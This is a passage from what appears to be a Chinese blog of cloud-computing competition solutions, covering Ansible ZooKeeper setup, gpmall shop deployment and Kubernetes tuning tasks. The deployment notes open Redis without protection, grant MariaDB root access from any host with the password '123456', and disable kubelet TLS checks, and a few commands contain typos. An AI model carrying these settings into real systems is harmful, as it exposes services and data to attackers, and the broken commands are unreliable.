<p>实现 zookeeper 集群搭建，创建任务清单实现 zookeeper 安装包批量解压、通过 Janja2 模板</p>
<p>文件配置 zookeeper、创建 zookeeper 的 myid 文件和批量启动 zookeeper 功能。在三个节点</p>
<p>相应的目录使用.&#x2F;zkServer.sh status 命令查看三个 Zookeeper 节点的状态。</p>
<p>在 ansible 主机上将 cat zookeeper.yaml 命令结果提交到答题框，将 jps 命令的返回结果</p>
<p>提交到答题框。【2 分】</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">[root@ansible zookeeper]# jps</span><br><span class="line">7620 Jps</span><br><span class="line">7574 QuorumPeerMain</span><br><span class="line"></span><br><span class="line">[root@ansible zookeeper]# <span class="built_in">cat</span> zookeeper.yaml</span><br><span class="line">---</span><br><span class="line">- hosts: zookeeper</span><br><span class="line">  tasks:</span><br><span class="line">  - name: install inneed</span><br><span class="line">    yum: name=java-1.8.0-openjdk* state=present</span><br><span class="line">  - name: tar zookeeper</span><br><span class="line">    copy: src=/root/zookeeper-3.4.14.tar.gz dest=/opt/</span><br><span class="line">  - name: tar zookeeper</span><br><span class="line">    shell: tar zxvf /opt/zookeeper-3.4.14.tar.gz -C /opt</span><br><span class="line">  - name: copy</span><br><span class="line">    copy: src=zoo.cfg dest=/opt/zookeeper-3.4.14/conf/</span><br><span class="line">  - name: create file</span><br><span class="line">    file: path=/tmp/zookeeper state=directory</span><br><span class="line">  - name: copy j2id</span><br><span class="line">    template: src=myid.j2 dest=/tmp/zookeeper/myid</span><br><span class="line">  - name: start zk</span><br><span class="line">    shell: <span class="string">&quot;/opt/zookeeper-3.4.14/bin/zkServer.sh start&quot;</span></span><br></pre></td></tr></table></figure>

<p>解法:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">[root@ansible zookeeper]# <span class="built_in">cat</span> zoo.cfg</span><br><span class="line">tickTime=2000</span><br><span class="line">initLimit=10</span><br><span class="line">syncLimit=5</span><br><span class="line">dataDir=/tmp/zookeeper</span><br><span class="line">clientPort=2181</span><br><span class="line">server.1=ansible:2888:3888</span><br><span class="line">server.2=host1:2888:3888</span><br><span class="line">server.3=host2:2888:3888</span><br><span class="line"></span><br><span class="line">[root@ansible zookeeper]# <span class="built_in">cat</span> myid.j2</span><br><span class="line">&#123;&#123;  zk_id &#125;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>任务 2 应用商城系统部署【10 分】</strong></p>
<p>1.在 ansible 节点，使用提供的 gpmall-cluster 软件包，完成集群应用系统部署。部署完成后，</p>
<p>进行登录，最后使用 curl 命令去获取商城首页的返回信息，</p>
<p>先将 netstat –ntpl 命令的返回结果提交到答题框，然后将 curl -l <a href="http://eip/">http://EIP:80</a> 命令的返回</p>
<p>结果提交到答题框。【10 分】</p>
<p><img src="C:\Users\user\AppData\Roaming\Typora\typora-user-images\image-20230316200644461.png" alt="image-20230316200644461"></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment">#在controller节点进行操作</span></span><br><span class="line">将文件包进行上传,目前已完成mariadb,zookeeper部署</span><br><span class="line"></span><br><span class="line">[root@ansible ~]# <span class="built_in">cat</span> /etc/hosts</span><br><span class="line">127.0.0.1   localhost localhost.localdomain localhost4 localhost4.localdomain4</span><br><span class="line">::1         localhost localhost.localdomain localhost6 localhost6.localdomain6</span><br><span class="line">192.168.157.20 ansible-control ansible</span><br><span class="line">192.168.157.21 ansible-compute1 host1</span><br><span class="line">192.168.157.22 ansible-compute2 host2</span><br><span class="line">192.168.157.23 ansible-compute3</span><br><span class="line">127.0.0.1 mysql.mall</span><br><span class="line">127.0.0.1 redis.mall</span><br><span class="line">127.0.0.1 zk1.mall</span><br><span class="line">127.0.0.1 kafka1.mall</span><br><span class="line"></span><br><span class="line"><span class="comment">##配置kafka</span></span><br><span class="line"><span class="built_in">cd</span> kafka_2.11-1.1.1</span><br><span class="line">[root@ansible ~]# <span class="built_in">cd</span> kafka_2.11-1.1.1</span><br><span class="line">[root@ansible kafka_2.11-1.1.1]# <span class="built_in">ls</span></span><br><span class="line">bin  config  libs  LICENSE  NOTICE  site-docs</span><br><span class="line">[root@ansible kafka_2.11-1.1.1]# <span class="built_in">cd</span> bin/</span><br><span class="line">[root@ansible bin]# ./kafka-server-start.sh ../config/server.properties</span><br><span class="line"></span><br><span class="line"><span class="comment">#配置redis</span></span><br><span class="line"><span class="comment"># yum install -y redis </span></span><br><span class="line"><span class="comment"># sed -i &#x27;s/bind 127.0.0.1/#bind 127.0.0.1/g&#x27; /etc/redis.conf</span></span><br><span class="line"><span class="comment"># sed -i &#x27;s/protected-mode yes/protected-mode no/g&#x27; /etc/redis.conf</span></span><br><span class="line"><span class="comment"># redis-server etc/redis.conf</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#配置mariadb</span></span><br><span class="line">mysql -u root -p123456 -e <span class="string">&quot;grant all on *.* to &#x27;root&#x27;@&#x27;% identified by &#x27;123456&#x27;;&quot;</span></span><br><span class="line">mysql -u root -p123456 -e <span class="string">&#x27;create database gpmall default character set=utf8;&#x27;</span></span><br><span class="line">mysql -u root -p123456 -e <span class="string">&quot;user gpmall;source/root/gpmall.sql&quot;</span></span><br><span class="line">  <span class="comment">##修改端口</span></span><br><span class="line">[root@ansible bin]# <span class="built_in">cat</span> /etc/my.cnf</span><br><span class="line"></span><br><span class="line">[mysqld]</span><br><span class="line">port=8066</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#配置nginx</span></span><br><span class="line"><span class="comment">#  vi /etc/nginx/conf.d/default.conf</span></span><br><span class="line">server &#123;</span><br><span class="line">    listen       80;</span><br><span class="line">    server_name  localhost;</span><br><span class="line"></span><br><span class="line">    <span class="comment">#charset koi8-r;</span></span><br><span class="line">    <span class="comment">#access_log  /var/log/nginx/host.access.log  main;</span></span><br><span class="line"></span><br><span class="line">    location / &#123;</span><br><span class="line">        root   /usr/share/nginx/html;</span><br><span class="line">        index  index.html index.htm;</span><br><span class="line">    &#125;</span><br><span class="line">    location /user &#123;</span><br><span class="line">        proxy_pass http://127.0.0.1:8082;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    location /shopping &#123;</span><br><span class="line">        proxy_pass http://127.0.0.1:8081;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    location /cashier &#123;</span><br><span class="line">        proxy_pass http://127.0.0.1:8083;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">#error_page  404              /404.html;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># redirect server error pages to the static page /50x.html</span></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    error_page   500 502 503 504  /50x.html;</span><br><span class="line">    location = /50x.html &#123;</span><br><span class="line">        root   /usr/share/nginx/html;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># proxy the PHP scripts to Apache listening on 127.0.0.1:80</span></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    <span class="comment">#location ~ \.php$ &#123;</span></span><br><span class="line">    <span class="comment">#    proxy_pass   http://127.0.0.1;</span></span><br><span class="line">    <span class="comment">#&#125;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># pass the PHP scripts to FastCGI server listening on 127.0.0.1:9000</span></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    <span class="comment">#location ~ \.php$ &#123;</span></span><br><span class="line">    <span class="comment">#    root           html;</span></span><br><span class="line">    <span class="comment">#    fastcgi_pass   127.0.0.1:9000;</span></span><br><span class="line">    <span class="comment">#    fastcgi_index  index.php;</span></span><br><span class="line">    <span class="comment">#    fastcgi_param  SCRIPT_FILENAME  /scripts$fastcgi_script_name;</span></span><br><span class="line">    <span class="comment">#    include        fastcgi_params;</span></span><br><span class="line">    <span class="comment">#&#125;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># deny access to .htaccess files, if Apache&#x27;s document root</span></span><br><span class="line">    <span class="comment"># concurs with nginx&#x27;s one</span></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    <span class="comment">#location ~ /\.ht &#123;</span></span><br><span class="line">    <span class="comment">#    deny  all;</span></span><br><span class="line">    <span class="comment">#&#125;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">systemctl <span class="built_in">enable</span> nginx</span><br><span class="line"></span><br><span class="line"><span class="comment"># rm -rf /usr/share/nginx/html/*</span></span><br><span class="line"><span class="comment"># cp -rvf dist/* /usr/share/nginx/html/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#启动jar包</span></span><br><span class="line"><span class="built_in">nohup</span> java -jar user-provider-0.0.1-SNAPSHOT.jar &amp;</span><br><span class="line"><span class="built_in">nohup</span> java -jar shopping-provider-0.0.1-SNAPSHOT.jar &amp;</span><br><span class="line"><span class="built_in">nohup</span> java -jar gpmall-shopping-0.0.1-SNAPSHOT.jar &amp;</span><br><span class="line"><span class="built_in">nohup</span> java -jar gpmall-user-0.0.1-SNAPSHOT.jar &amp;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>云计算</category>
        <category>技能大赛汇总</category>
      </categories>
      <tags>
        <tag>云计算</tag>
        <tag>云计算职业技能大赛</tag>
      </tags>
  </entry>
  <entry>
    <title>云计算方向-Kubernetes调优</title>
    <url>/posts/4d653f4a.html</url>
    <content><![CDATA[<h1 id="K8S调优"><a href="#K8S调优" class="headerlink" title="K8S调优"></a><strong>K8S调优</strong></h1><p>[TOC]</p>
<h2 id="一-健康检查"><a href="#一-健康检查" class="headerlink" title="一.健康检查"></a>一.健康检查</h2><h3 id="题目要求"><a href="#题目要求" class="headerlink" title="题目要求"></a>题目要求</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">1.健康检查--ExecAction</span><br><span class="line">在 master 节点/root 目录下编写 yaml 文件 liveness_exec.yaml，具体要求如下：</span><br><span class="line">（1）Pod 名称：liveness-exec；</span><br><span class="line">（2）命名空间：default；</span><br><span class="line">（3）镜像：busybox；容器名称：liveness；</span><br><span class="line">（4）容器启动时运行命令“touch /tmp/healthy; sleep 60; rm -rf /tmp/healthy; sleep 600”，</span><br><span class="line">此命令在容器启动时创建/tmp/healthy 文件，并于 60 秒之后将其删除；</span><br><span class="line">（5）存活性探针运行“test -e /tmp/healthy”命令检查文件的存在性，若文件存在则返</span><br><span class="line">回状态码为 0，表示成功通过测试；</span><br><span class="line">（6）启动后延时 5 秒开始运行检测；</span><br><span class="line">（7）每隔 5 秒执行一次 liveness probe。</span><br><span class="line">完成后使用该 yaml 文件创建 Pod</span><br></pre></td></tr></table></figure>

<h3 id="1-解决方法"><a href="#1-解决方法" class="headerlink" title="1.解决方法"></a>1.解决方法</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">在root目录下创建 live-ness.yaml文件</span><br><span class="line">#vi live-ness.yaml</span><br></pre></td></tr></table></figure>

<h4 id="①编写yaml文件"><a href="#①编写yaml文件" class="headerlink" title="①编写yaml文件"></a>①编写yaml文件</h4><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Pod</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">labels:</span></span><br><span class="line">    <span class="attr">test:</span> <span class="string">liveness</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">liveness-exec</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">containers:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">liveness</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">busybox</span></span><br><span class="line">    <span class="attr">args:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">/bin/sh</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">-c</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">touch</span> <span class="string">/tmp/healthy;</span> <span class="string">sleep</span> <span class="number">60</span><span class="string">;</span> <span class="string">rm</span> <span class="string">-rf</span> <span class="string">/tmp/healthy;</span> <span class="string">sleep</span> <span class="number">600</span></span><br><span class="line">    <span class="attr">livenessProbe:</span></span><br><span class="line">      <span class="attr">exec:</span></span><br><span class="line">        <span class="attr">command:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="string">test</span></span><br><span class="line">        <span class="bullet">-</span> <span class="string">-e</span></span><br><span class="line">        <span class="bullet">-</span> <span class="string">/tmp/healthy</span></span><br><span class="line">      <span class="attr">initialDelaySeconds:</span> <span class="number">5</span> <span class="comment">#检查文件延迟五秒进行</span></span><br><span class="line">      <span class="attr">periodSeconds:</span> <span class="number">5</span>    <span class="comment">#每五秒执行一次检查</span></span><br></pre></td></tr></table></figure>

<h4 id="②最后可观察到pod会重启，任务完成。"><a href="#②最后可观察到pod会重启，任务完成。" class="headerlink" title="②最后可观察到pod会重启，任务完成。"></a>②最后可观察到pod会重启，任务完成。</h4><h2 id="二-更新证书"><a href="#二-更新证书" class="headerlink" title="二.更新证书"></a>二.更新证书</h2><h3 id="题目要求-1"><a href="#题目要求-1" class="headerlink" title="题目要求"></a>题目要求</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">2.更新证书</span><br><span class="line">Kubernetes 默认的证书有效期只有一年时间，对于某些场景下一个足够长的证书有效期</span><br><span class="line">是非常有必要的。请将 Kubernetes 集群证书的有效期延长至 10 年。</span><br></pre></td></tr></table></figure>

<h3 id="1-go环境部署"><a href="#1-go环境部署" class="headerlink" title="1. go环境部署"></a>1. go环境部署</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wget https://dl.google.com/go/go1.12.7.linux-amd64.tar.gz</span><br><span class="line">tar -zxvf go1.12.7.linux-amd64.tar.gz -C /usr/local</span><br><span class="line"></span><br><span class="line">vi /etc/profile  #修改的内容放在最后即可</span><br><span class="line">   export PATH=$PATH:/usr/local/go/bin</span><br><span class="line">source /etc/profile #让文件生效</span><br></pre></td></tr></table></figure>

<h3 id="2-下载源码"><a href="#2-下载源码" class="headerlink" title="2.下载源码"></a>2.下载源码</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd /data &amp;&amp; git clone https://github.com/kubernetes/kubernetes.git</span><br><span class="line">git checkout -b remotes/origin/release-1.15.1 v1.15.1</span><br></pre></td></tr></table></figure>

<h3 id="3-修改-kubeadm-源码包更新证书策略"><a href="#3-修改-kubeadm-源码包更新证书策略" class="headerlink" title="3.修改 kubeadm 源码包更新证书策略"></a>3.修改 kubeadm 源码包更新证书策略</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> kubernetes</span><br><span class="line">vi staging/src/k8s.io/client-go/util/cert/cert.go   <span class="comment">#kubeadm 1.14 版本之前</span></span><br><span class="line">vi cmd/kubeadm/app/util/pkiutil/pki_helpers.go     <span class="comment">#kubeadm 1.14 至今</span></span><br><span class="line">    const duration3650d = time.Hour * 24 *365 * 10  <span class="comment">#定义一个常量 大约在540多行</span></span><br><span class="line">    NotAfter:          time.Now().Add(duration3650d).UTC(),</span><br><span class="line">make WHAT=cmd/kubeadm GOFLAGS=-v</span><br><span class="line"><span class="built_in">cp</span> _output/bin/kubeadm /root/kubeadm-new</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\user\AppData\Roaming\Typora\typora-user-images\image-20220708120800491.png" alt="修改配置"></p>
<p><img src="C:\Users\user\AppData\Roaming\Typora\typora-user-images\image-20220708121035024.png" alt="image-20220708121035024"></p>
<h3 id="4-更新-kubeadm"><a href="#4-更新-kubeadm" class="headerlink" title="4.更新 kubeadm"></a>4.更新 kubeadm</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">将 kubeadm 进行替换</span></span><br><span class="line">cp /usr/bin/kubeadm /usr/bin/kubeadm.old</span><br><span class="line">cp /root/kubeadm-new /usr/bin/kubeadm</span><br><span class="line">chmod a+x /usr/bin/kubeadm</span><br></pre></td></tr></table></figure>

<h3 id="5-更新各节点证书至Master节点"><a href="#5-更新各节点证书至Master节点" class="headerlink" title="5.更新各节点证书至Master节点"></a>5.更新各节点证书至Master节点</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cp -r /etc/kubernetes/pki /etc/kubernetes/pki.old</span><br><span class="line">cd /etc/kubernetes/pki</span><br><span class="line">kubeadm alpha certs renew all --config=/root/kubeadm-config.yaml </span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">若没有该文件可以使用kubeadm config <span class="built_in">print</span> init-defaults  &gt; kubeadm-config.yaml  用来生成kubeadm-config.yaml 文件</span></span><br><span class="line">openssl x509 -in apiserver.crt -text -noout | grep Not</span><br></pre></td></tr></table></figure>

<h3 id="6-HA集群其余master节点证书更新"><a href="#6-HA集群其余master节点证书更新" class="headerlink" title="6. HA集群其余master节点证书更新"></a>6. HA集群其余master节点证书更新</h3><p><img src="C:\Users\user\AppData\Roaming\Typora\typora-user-images\image-20220708122015445.png" alt="image-20220708122015445"></p>
<h2 id="三-自定义资源管理（CRD）"><a href="#三-自定义资源管理（CRD）" class="headerlink" title="三.自定义资源管理（CRD）"></a>三.自定义资源管理（CRD）</h2><h3 id="CRD简介"><a href="#CRD简介" class="headerlink" title="CRD简介"></a>CRD简介</h3><p>Custom resources：是对K8S API的扩展，代表了一个特定的kubetnetes的定制化安装。在一个运行中的集群中，自定义资源可以动态注册到集群中。注册完毕以后，用户可以通过kubelet创建和访问这个自定义的对象，类似于操作pod一样。</p>
<p>Custom controllers：Custom resources可以让用户简单的存储和获取结构化数据。只有结合控制器才能变成一个真正的declarative API（被声明过的API）。控制器可以把资源更新成用户想要的状态，并且通过一系列操作维护和变更状态。定制化控制器是用户可以在运行中的集群内部署和更新的一个控制器，它独立于集群本身的生命周期。<br>定制化控制器可以和任何一种资源一起工作，当和定制化资源结合使用时尤其有效。</p>
<p>Operator模式 是一个customer controllers和Custom resources结合的例子。它可以允许开发者将特殊应用编码至kubernetes的扩展API内。</p>
<h3 id="题目要求："><a href="#题目要求：" class="headerlink" title="题目要求："></a>题目要求：</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">3.自定义资源管理</span><br><span class="line">在 Kubernetes 中一切都可视为资源，通过自定义资源我们可以向 Kubernetes API 中增</span><br><span class="line">加新资源类型。在 master 节点/root 目录下编写 yaml 文件 resource.yaml，具体要求如下：</span><br><span class="line">（1）自定义资源名称：crontabs.stable.example.com；</span><br><span class="line">（2）指定自定义资源作用范围为命名空间；</span><br><span class="line">（3）指定每个版本都可以通过 served 标志来独立启用或禁止；</span><br><span class="line">（4）指定其中有且只有一个版本必需被标记为存储版本 v1。</span><br><span class="line">完成后使用该 yaml 文件创建自定义资源</span><br></pre></td></tr></table></figure>

<h3 id="1-编写crontab-crd-yml"><a href="#1-编写crontab-crd-yml" class="headerlink" title="1.编写crontab_crd.yml"></a>1.编写<strong>crontab_crd.yml</strong></h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">apiVersion: apiextensions.k8s.io/v1beta1</span><br><span class="line">kind: CustomResourceDefinition</span><br><span class="line">metadata:</span><br><span class="line"><span class="meta prompt_">  # </span><span class="language-bash">称必须与下面的spec字段匹配，格式为: &lt;plural&gt;.&lt;group&gt;</span></span><br><span class="line">  name: crontabs.crd.test.com</span><br><span class="line">spec:</span><br><span class="line"><span class="meta prompt_">  # </span><span class="language-bash">用于REST API的组名称: /apis/&lt;group&gt;/&lt;version&gt;</span></span><br><span class="line">  group: crd.test.com</span><br><span class="line">  versions:</span><br><span class="line">  - name: v1</span><br><span class="line">    # 每个版本都可以通过服务标志启用/禁用。</span><br><span class="line">    served: true</span><br><span class="line">    # 必须将一个且只有一个版本标记为存储版本。</span><br><span class="line">    storage: true</span><br><span class="line">  scope: Namespaced  # 指定crd资源作用范围在命名空间或集群</span><br><span class="line">  names:</span><br><span class="line">    # URL中使用的复数名称: /apis/&lt;group&gt;/&lt;version&gt;/&lt;plural&gt;</span><br><span class="line">    plural: crontabs</span><br><span class="line">    # 在CLI(shell界面输入的参数)上用作别名并用于显示的单数名称</span><br><span class="line">    singular: crontab</span><br><span class="line">    kind: CronTab</span><br><span class="line">    # 短名称允许短字符串匹配CLI上的资源，意识就是能通过kubectl 在查看资源的时候使用该资源的简名称来获取。</span><br><span class="line">    shortNames:</span><br><span class="line">    - ct</span><br></pre></td></tr></table></figure>

<h3 id="2-创建crd"><a href="#2-创建crd" class="headerlink" title="2.创建crd"></a>2.创建crd</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">kubectl apply -f crontab_crd.yml</span><br><span class="line">kubectl get crd | grep crontab   #查看crd</span><br></pre></td></tr></table></figure>

<h3 id="3-编写测试文件test-crontab-yaml"><a href="#3-编写测试文件test-crontab-yaml" class="headerlink" title="3.编写测试文件test_crontab.yaml"></a>3.编写测试文件test_crontab.yaml</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">apiVersion: crd.test.com/v1</span><br><span class="line">kind: CronTab</span><br><span class="line">metadata:</span><br><span class="line">  name: my-test-crontab</span><br><span class="line">spec:</span><br><span class="line">  cronSpec: &quot;* * * * */10&quot;</span><br><span class="line">  image: my-test-image</span><br><span class="line">  replicas: 2</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="4-创建测试文件并检查是否成功"><a href="#4-创建测试文件并检查是否成功" class="headerlink" title="4.创建测试文件并检查是否成功"></a>4.创建测试文件并检查是否成功</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kubectl apply -f test_crontab.yml</span><br><span class="line">kubectl get ct</span><br></pre></td></tr></table></figure>

<h3 id="5-删除自定义对象"><a href="#5-删除自定义对象" class="headerlink" title="5.删除自定义对象"></a>5.删除自定义对象</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kubectl delete  ct my-test-crontab  #删除自定义对象</span><br><span class="line">kubectl delete crd crontabs.crd.test.com  #删除crd</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h2 id="四-HPA管理"><a href="#四-HPA管理" class="headerlink" title="四.HPA管理"></a>四.HPA管理</h2><h3 id="原理："><a href="#原理：" class="headerlink" title="原理："></a>原理：</h3><p>HPA可以获取每个Pod利用率，然后和HPA中定义的指标进行对比，同时计算出需要伸缩的具体值，最后实现Pod的数量的调整。其实HPA与之前的Deployment一样，也属于一种Kubernetes资源对象，它通过追踪分析RC控制的所有目标Pod的负载变化情况，来确定是否需要针对性地调整目标Pod的副本数，这是HPA的实现原理。</p>
<h3 id="题目要求-2"><a href="#题目要求-2" class="headerlink" title="题目要求"></a>题目要求</h3><p>在 master 节点&#x2F;root 目录下编写 yaml 文件 deployment-hpa.yaml，具体要求如下：<br>（1）HPA 名称：deployment-hpa；<br>（2）命名空间：default；<br>（3）基于 deployment 进行伸缩，副本数伸缩范围：1–10；<br>（4）期望每个 Pod 的 CPU 和内存使用率为 50%。<br>完成后使用该 yaml 文件创建 HPA</p>
<h3 id="1-安装metrics-server"><a href="#1-安装metrics-server" class="headerlink" title="1.安装metrics-server"></a>1.安装metrics-server</h3><p>(用来收集集群中的资源使用情况)</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">安装git</span></span><br><span class="line">wget -c https://github.com/kubernetes-sigs/metrics-server/archive/v0.3.6.zip</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">解压文件</span></span><br><span class="line">unzip v0.3.6.zip</span><br></pre></td></tr></table></figure>

<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 修改deployment, 注意修改的是镜像和初始化参数</span></span><br><span class="line"><span class="string">cd</span> <span class="string">/root/metrics-server/deploy/1.8+/</span></span><br><span class="line"></span><br><span class="line"><span class="string">vi</span> <span class="string">metrics-server-deployment.yaml</span></span><br><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">ServiceAccount</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">metrics-server</span></span><br><span class="line">  <span class="attr">namespace:</span> <span class="string">kube-system</span></span><br><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="attr">apiVersion:</span> <span class="string">apps/v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Deployment</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">metrics-server</span></span><br><span class="line">  <span class="attr">namespace:</span> <span class="string">kube-system</span></span><br><span class="line">  <span class="attr">labels:</span></span><br><span class="line">    <span class="attr">k8s-app:</span> <span class="string">metrics-server</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">selector:</span></span><br><span class="line">    <span class="attr">matchLabels:</span></span><br><span class="line">      <span class="attr">k8s-app:</span> <span class="string">metrics-server</span></span><br><span class="line">  <span class="attr">template:</span></span><br><span class="line">    <span class="attr">metadata:</span></span><br><span class="line">      <span class="attr">name:</span> <span class="string">metrics-server</span></span><br><span class="line">      <span class="attr">labels:</span></span><br><span class="line">        <span class="attr">k8s-app:</span> <span class="string">metrics-server</span></span><br><span class="line">    <span class="attr">spec:</span></span><br><span class="line">      <span class="attr">serviceAccountName:</span> <span class="string">metrics-server</span></span><br><span class="line">      <span class="attr">volumes:</span></span><br><span class="line">      <span class="comment"># mount in tmp so we can safely use from-scratch images and/or read-only containers</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">tmp-dir</span></span><br><span class="line">        <span class="attr">emptyDir:</span> &#123;&#125;</span><br><span class="line">      <span class="attr">containers:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">metrics-server</span></span><br><span class="line">        <span class="attr">image:</span> <span class="string">k8s.gcr.io/metrics-server-amd64:v0.3.6</span></span><br><span class="line">        <span class="attr">imagePullPolicy:</span> <span class="string">IfNotPresent</span></span><br><span class="line">        <span class="attr">command:</span></span><br><span class="line">            <span class="bullet">-</span> <span class="string">/metrics-server</span></span><br><span class="line">            <span class="comment">#start</span></span><br><span class="line">            <span class="bullet">-</span> <span class="string">--kubelet-preferred-address-types=InternalIP</span></span><br><span class="line">            <span class="bullet">-</span> <span class="string">--kubelet-insecure-tls</span></span><br><span class="line">            <span class="comment">#end</span></span><br><span class="line">        <span class="attr">volumeMounts:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">tmp-dir</span></span><br><span class="line">          <span class="attr">mountPath:</span> <span class="string">/tmp</span></span><br></pre></td></tr></table></figure>

<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment">#安装软件</span></span><br><span class="line">kubectl apply -f .</span><br><span class="line"><span class="comment"># 查看pod运行情况</span></span><br><span class="line">kubectl get pod -n kube-system</span><br><span class="line">metrics-server-6b976979db-2xwbj   1/1     Running   0 </span><br><span class="line">          90s</span><br><span class="line">          <span class="comment"># 使用kubectl top node 查看资源使用情况</span></span><br><span class="line">kubectl top node</span><br><span class="line">NAME           CPU(cores)   CPU%   MEMORY(bytes)   MEMORY%</span><br><span class="line">k8s-master01   289m         14%    1582Mi          54%       </span><br><span class="line">k8s-node01     81m          4%     1195Mi          40%       </span><br><span class="line">k8s-node02     72m          3%     1211Mi          41%  </span><br><span class="line">kubectl top pod -n kube-system</span><br><span class="line">NAME                              CPU(cores)   MEMORY(bytes)</span><br><span class="line">coredns-6955765f44-7ptsb          3m           9Mi</span><br><span class="line">coredns-6955765f44-vcwr5          3m           8Mi</span><br><span class="line">etcd-master                       14m          145Mi</span><br><span class="line">...</span><br><span class="line"><span class="comment"># 至此,metrics-server安装完成</span></span><br></pre></td></tr></table></figure>

<h3 id="2-准备deployment和service"><a href="#2-准备deployment和service" class="headerlink" title="2.准备deployment和service"></a>2.准备deployment和service</h3><p>创建pc-hpa-pod.yaml文件，内容如下：</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">apps/v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Deployment</span></span><br><span class="line"><span class="attr">metadata:</span> </span><br><span class="line">  <span class="attr">name:</span> <span class="string">nginx</span></span><br><span class="line">  <span class="attr">namespace:</span> <span class="string">default</span></span><br><span class="line"><span class="attr">spec:</span> </span><br><span class="line">  <span class="attr">replicas:</span> <span class="number">1</span></span><br><span class="line">  <span class="attr">selector:</span></span><br><span class="line">    <span class="attr">matchLabels:</span></span><br><span class="line">      <span class="attr">app:</span> <span class="string">nginx-pod</span></span><br><span class="line">  <span class="attr">template:</span></span><br><span class="line">    <span class="attr">metadata:</span></span><br><span class="line">      <span class="attr">labels:</span></span><br><span class="line">        <span class="attr">app:</span> <span class="string">nginx-pod</span></span><br><span class="line">    <span class="attr">spec:</span></span><br><span class="line">      <span class="attr">containers:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">nginx</span></span><br><span class="line">        <span class="attr">image:</span> <span class="string">nginx:1.17.1</span></span><br><span class="line">        <span class="attr">resources:</span> <span class="comment"># 资源配额</span></span><br><span class="line">          <span class="attr">limits:</span>  <span class="comment"># 限制资源（上限）</span></span><br><span class="line">            <span class="attr">cpu:</span> <span class="string">&quot;1&quot;</span> <span class="comment"># CPU限制，单位是core数</span></span><br><span class="line">          <span class="attr">requests:</span> <span class="comment"># 请求资源（下限）</span></span><br><span class="line">            <span class="attr">cpu:</span> <span class="string">&quot;100m&quot;</span>  <span class="comment"># 